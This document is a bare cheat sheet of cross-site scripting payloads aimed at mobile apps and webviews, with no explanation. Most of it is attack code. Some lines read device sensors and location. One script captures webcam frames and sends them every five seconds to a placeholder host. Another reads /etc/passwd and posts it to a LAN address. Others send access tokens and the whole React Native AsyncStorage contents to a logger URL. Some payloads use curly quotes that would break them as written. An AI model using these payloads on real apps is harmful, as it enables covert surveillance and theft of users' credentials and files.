# XSS In Mobile App
```
<body onorientationchange=alert(orientation)>

<html ontouchstart=alert(1)>

<html ontouchend=alert(1)>

<html ontouchmove=alert(1)>

<html ontouchcancel=alert(1)>

<svg onload=alert(navigator.connection.type)>

<svg onload=alert(navigator.battery.level)>

<svg onload=alert(navigator.battery.dischargingTime)>

<svg onload=alert(navigator.battery.charging)>

<script>
navigator.geolocation.getCurrentPosition(function(p){
alert('Latitude:'+p.coords.latitude+',Longitude:'+
p.coords.longitude+',Altitude:'+p.coords.altitude);})
</script>

<script>
d=document;
v=d.createElement(‘video’);
c=d.createElement(‘canvas’);
c.width=640;
c.height=480;
navigator.webkitGetUserMedia({‘video’:true},function(s){
v.src=URL.createObjectURL(s);v.play()},function(){});
c2=c.getContext(‘2d’);
x=’c2.drawImage(v,0,0,640,480);fetch(“//HOST/”+c2.canvas.toDataURL())‘;
setInterval(x,5000);
</script>

<svg onload=navigator.vibrate(500)>

<svg onload=navigator.vibrate([500,300,100])>

<script> 
var request = new XMLHttpRequest(); 
request.open("GET","file:///etc/passwd",false); 
request.send(); 
request.open("POST","http://192.168.1.103",false); 
request.send(request.responseText); 
</script>

<script>const req = new XMLHttpRequest(); req.open('GET', 'http://192.168.1.102', false); req.send(null);</script>

<script>const req = new XMLHttpRequest(); req.open('GET', 'file:///etc/passwd', false); req.send(null); alert(req.responseText);</script>

fetch(‘http://example.com/logger.php?token='+localStorage.access_token);

_reactNative.AsyncStorage.getAllKeys(function(err,result){_reactNative.AsyncStorage.multiGet(result,function(err,result){fetch(‘http://example.com/logger.php?token='+JSON.stringify(result));});});
```